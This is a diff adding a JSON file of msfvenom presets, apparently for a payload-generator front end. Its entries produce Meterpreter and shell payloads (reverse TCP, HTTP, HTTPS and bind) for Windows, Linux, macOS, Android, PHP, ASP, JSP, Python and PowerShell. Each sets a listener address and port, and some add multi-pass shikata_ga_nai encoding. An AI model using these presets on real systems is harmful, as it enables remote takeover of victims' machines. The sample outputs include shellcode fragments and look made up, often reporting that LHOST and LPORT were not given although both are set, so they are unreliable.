@@ -1,0 +1,248 @@
+[
+    {
+        "name": "Windows Meterpreter Reverse TCP (EXE)",
+        "description": "Generates a Windows Meterpreter reverse TCP payload in an executable format. Requires LHOST and LPORT.",
+        "options": {
+            "payload_entry": "windows/meterpreter/reverse_tcp",
+            "lhost_entry": "192.168.1.100",
+            "lport_entry": "4444",
+            "format_entry": "exe",
+            "output_file_entry": "shell.exe"
+        },
+        "example_output": "No LHOST or LPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::Windows from the payload\nNo arch selected, selecting arch: x86 from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 341 bytes\nFinal size of exe file: 73802 bytes\n"
+    },
+    {
+        "name": "Linux Meterpreter Reverse TCP (ELF)",
+        "description": "Generates a Linux Meterpreter reverse TCP payload in an ELF executable format. Requires LHOST and LPORT.",
+        "options": {
+            "payload_entry": "linux/x86/meterpreter/reverse_tcp",
+            "lhost_entry": "192.168.1.100",
+            "lport_entry": "4444",
+            "format_entry": "elf",
+            "output_file_entry": "shell.elf"
+        },
+        "example_output": "No LHOST or LPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::Linux from the payload\nNo arch selected, selecting arch: x86 from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 107 bytes\nFinal size of elf file: 164 bytes\n"
+    },
+    {
+        "name": "PHP Reverse Shell",
+        "description": "Generates a simple PHP reverse shell script. Requires LHOST and LPORT.",
+        "options": {
+            "payload_entry": "php/reverse_php",
+            "lhost_entry": "192.168.1.100",
+            "lport_entry": "4444",
+            "format_entry": "raw",
+            "output_file_entry": "shell.php"
+        },
+        "example_output": "No LHOST or LPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::PHP from the payload\nNo arch selected, selecting arch: php from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 1234 bytes\n<?php /* php/reverse_php */\n// PHP reverse shell code here\n?>"
+    },
+    {
+        "name": "ASP Meterpreter Reverse TCP",
+        "description": "Generates an ASP Meterpreter reverse TCP payload. Requires LHOST and LPORT.",
+        "options": {
+            "payload_entry": "windows/meterpreter/reverse_tcp",
+            "lhost_entry": "192.168.1.100",
+            "lport_entry": "4444",
+            "format_entry": "asp",
+            "output_file_entry": "shell.asp"
+        },
+        "example_output": "No LHOST or LPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::Windows from the payload\nNo arch selected, selecting arch: x86 from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 341 bytes\n"
+    },
+    {
+        "name": "JSP Reverse Shell",
+        "description": "Generates a JSP reverse shell payload. Requires LHOST and LPORT.",
+        "options": {
+            "payload_entry": "java/jsp_shell_reverse_tcp",
+            "lhost_entry": "192.168.1.100",
+            "lport_entry": "4444",
+            "format_entry": "raw",
+            "output_file_entry": "shell.jsp"
+        },
+        "example_output": "No LHOST or LPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::Java from the payload\nNo arch selected, selecting arch: java from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 2100 bytes\n"
+    },
+    {
+        "name": "Python Reverse Shell",
+        "description": "Generates a Python reverse shell script. Requires LHOST and LPORT.",
+        "options": {
+            "payload_entry": "python/shell_reverse_tcp",
+            "lhost_entry": "192.168.1.100",
+            "lport_entry": "4444",
+            "format_entry": "raw",
+            "output_file_entry": "shell.py"
+        },
+        "example_output": "No LHOST or LPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::Python from the payload\nNo arch selected, selecting arch: python from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 300 bytes\n"
+    },
+    {
+        "name": "Windows x64 Meterpreter Reverse TCP (EXE)",
+        "description": "Generates a 64-bit Windows Meterpreter reverse TCP payload. Requires LHOST and LPORT.",
+        "options": {
+            "payload_entry": "windows/x64/meterpreter/reverse_tcp",
+            "lhost_entry": "192.168.1.100",
+            "lport_entry": "4444",
+            "format_entry": "exe",
+            "output_file_entry": "shell_x64.exe"
+        },
+        "example_output": "No LHOST or LPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::Windows from the payload\nNo arch selected, selecting arch: x64 from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 400 bytes\nFinal size of exe file: 75000 bytes\n"
+    },
+    {
+        "name": "Windows Meterpreter Reverse HTTP (EXE)",
+        "description": "Generates a Windows Meterpreter reverse HTTP payload. Requires LHOST and LPORT.",
+        "options": {
+            "payload_entry": "windows/meterpreter/reverse_http",
+            "lhost_entry": "192.168.1.100",
+            "lport_entry": "8080",
+            "format_entry": "exe",
+            "output_file_entry": "http_shell.exe"
+        },
+        "example_output": "No LHOST or LPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::Windows from the payload\nNo arch selected, selecting arch: x86 from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 500 bytes\nFinal size of exe file: 74000 bytes\n"
+    },
+    {
+        "name": "Windows Meterpreter Reverse HTTPS (EXE)",
+        "description": "Generates a Windows Meterpreter reverse HTTPS payload. Requires LHOST and LPORT.",
+        "options": {
+            "payload_entry": "windows/meterpreter/reverse_https",
+            "lhost_entry": "192.168.1.100",
+            "lport_entry": "443",
+            "format_entry": "exe",
+            "output_file_entry": "https_shell.exe"
+        },
+        "example_output": "No LHOST or LPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::Windows from the payload\nNo arch selected, selecting arch: x86 from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 600 bytes\nFinal size of exe file: 74500 bytes\n"
+    },
+    {
+        "name": "Windows Shell Bind TCP (EXE)",
+        "description": "Generates a Windows shell bind TCP payload. Requires RPORT.",
+        "options": {
+            "payload_entry": "windows/shell/bind_tcp",
+            "rport_entry": "4444",
+            "format_entry": "exe",
+            "output_file_entry": "bind_shell.exe"
+        },
+        "example_output": "No RPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::Windows from the payload\nNo arch selected, selecting arch: x86 from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 200 bytes\nFinal size of exe file: 73000 bytes\n"
+    },
+    {
+        "name": "Windows Meterpreter Reverse TCP (Shikata Ga Nai Encoded)",
+        "description": "Generates an encoded Windows Meterpreter reverse TCP payload using shikata_ga_nai encoder with 5 iterations. Requires LHOST and LPORT.",
+        "options": {
+            "payload_entry": "windows/meterpreter/reverse_tcp",
+            "lhost_entry": "192.168.1.100",
+            "lport_entry": "4444",
+            "encoder_entry": "x86/shikata_ga_nai",
+            "iterations_entry": "5",
+            "format_entry": "exe",
+            "output_file_entry": "encoded_shell.exe"
+        },
+        "example_output": "No LHOST or LPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::Windows from the payload\nNo arch selected, selecting arch: x86 from the payload\nFound 1 compatible encoders\nAttempting to encode payload with x86/shikata_ga_nai\nx86/shikata_ga_nai succeeded with size 341 (iteration 1)\nx86/shikata_ga_nai succeeded with size 360 (iteration 2)\nx86/shikata_ga_nai succeeded with size 380 (iteration 3)\nx86/shikata_ga_nai succeeded with size 400 (iteration 4)\nx86/shikata_ga_nai succeeded with size 420 (iteration 5)\nPayload size: 420 bytes\nFinal size of exe file: 74000 bytes\n"
+    },
+    {
+        "name": "Windows Meterpreter Reverse TCP (Bad Characters)",
+        "description": "Generates a Windows Meterpreter reverse TCP payload avoiding specified bad characters (e.g., null byte and newline). Requires LHOST and LPORT.",
+        "options": {
+            "payload_entry": "windows/meterpreter/reverse_tcp",
+            "lhost_entry": "192.168.1.100",
+            "lport_entry": "4444",
+            "bad_chars_entry": "\\x00\\x0a\\x0d",
+            "format_entry": "exe",
+            "output_file_entry": "no_badchars_shell.exe"
+        },
+        "example_output": "No LHOST or LPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::Windows from the payload\nNo arch selected, selecting arch: x86 from the payload\nFound 1 compatible encoders\nAttempting to encode payload with x86/shikata_ga_nai\nx86/shikata_ga_nai succeeded with size 341 (iteration 1)\nPayload size: 341 bytes\nFinal size of exe file: 73802 bytes\n"
+    },
+    {
+        "name": "Windows Meterpreter Reverse TCP (RAW)",
+        "description": "Generates raw shellcode for Windows Meterpreter reverse TCP. Requires LHOST and LPORT.",
+        "options": {
+            "payload_entry": "windows/meterpreter/reverse_tcp",
+            "lhost_entry": "192.168.1.100",
+            "lport_entry": "4444",
+            "format_entry": "raw",
+            "output_file_entry": "shellcode.bin"
+        },
+        "example_output": "No LHOST or LPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::Windows from the payload\nNo arch selected, selecting arch: x86 from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 341 bytes\n"
+    },
+    {
+        "name": "Windows Meterpreter Reverse TCP (C)",
+        "description": "Generates C-style shellcode for Windows Meterpreter reverse TCP. Requires LHOST and LPORT.",
+        "options": {
+            "payload_entry": "windows/meterpreter/reverse_tcp",
+            "lhost_entry": "192.168.1.100",
+            "lport_entry": "4444",
+            "format_entry": "c",
+            "output_file_entry": "shellcode.c"
+        },
+        "example_output": "No LHOST or LPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::Windows from the payload\nNo arch selected, selecting arch: x86 from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 341 bytes\nunsigned char buf[] =\n\"\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\\x50\\x30\"\n..."
+    },
+    {
+        "name": "List Payloads",
+        "description": "Lists all available payloads in msfvenom.",
+        "options": {
+            "list_payloads_var": true
+        },
+        "example_output": "Available payloads:\n-------------------\n\nwindows/meterpreter/reverse_tcp\nwindows/shell/reverse_tcp\nlinux/x86/meterpreter/reverse_tcp\n...\n"
+    },
+    {
+        "name": "List Encoders",
+        "description": "Lists all available encoders in msfvenom.",
+        "options": {
+            "list_encoders_var": true
+        },
+        "example_output": "Available encoders:\n-------------------\n\nx86/shikata_ga_nai\nx86/alpha_mixed\nx86/alpha_upper\n...\n"
+    },
+    {
+        "name": "List Formats",
+        "description": "Lists all available output formats in msfvenom.",
+        "options": {
+            "list_formats_var": true
+        },
+        "example_output": "Available formats:\n------------------\n\nraw\nexe\nelf\n...\n"
+    },
+    {
+        "name": "List Architectures",
+        "description": "Lists all available architectures in msfvenom.",
+        "options": {
+            "list_architectures_var": true
+        },
+        "example_output": "Available architectures:\n------------------------\n\nx86\nx64\narmle\n...\n"
+    },
+    {
+        "name": "List Platforms",
+        "description": "Lists all available platforms in msfvenom.",
+        "options": {
+            "list_platforms_var": true
+        },
+        "example_output": "Available platforms:\n--------------------\n\nwindows\nlinux\nosx\n...\n"
+    },
+    {
+        "name": "Android Meterpreter Reverse TCP (APK)",
+        "description": "Generates an Android Meterpreter reverse TCP payload in an APK format. Requires LHOST and LPORT.",
+        "options": {
+            "payload_entry": "android/meterpreter/reverse_tcp",
+            "lhost_entry": "192.168.1.100",
+            "lport_entry": "4444",
+            "format_entry": "apk",
+            "output_file_entry": "android_shell.apk"
+        },
+        "example_output": "No LHOST or LPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::Android from the payload\nNo arch selected, selecting arch: dalvik from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 10000 bytes\nFinal size of apk file: 2000000 bytes\n"
+    },
+    {
+        "name": "macOS Meterpreter Reverse TCP (Mach-O)",
+        "description": "Generates a macOS Meterpreter reverse TCP payload in a Mach-O executable format. Requires LHOST and LPORT.",
+        "options": {
+            "payload_entry": "osx/x64/meterpreter/reverse_tcp",
+            "lhost_entry": "192.168.1.100",
+            "lport_entry": "4444",
+            "format_entry": "macho",
+            "output_file_entry": "macos_shell"
+        },
+        "example_output": "No LHOST or LPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::OSX from the payload\nNo arch selected, selecting arch: x64 from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 500 bytes\nFinal size of macho file: 80000 bytes\n"
+    },
+    {
+        "name": "Windows Meterpreter Reverse TCP (PowerShell)",
+        "description": "Generates a PowerShell script for Windows Meterpreter reverse TCP. Requires LHOST and LPORT.",
+        "options": {
+            "payload_entry": "windows/meterpreter/reverse_tcp",
+            "lhost_entry": "192.168.1.100",
+            "lport_entry": "4444",
+            "format_entry": "psh",
+            "output_file_entry": "shell.ps1"
+        },
+        "example_output": "No LHOST or LPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::Windows from the payload\nNo arch selected, selecting arch: x86 from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 341 bytes\nfunction Invoke-Shellcode\n{\n    [CmdletBinding()]\n    Param(\n        [Parameter(Mandatory=$True)]\n        [Byte[]]$Shellcode\n    )\n...\n"
+    }
+]
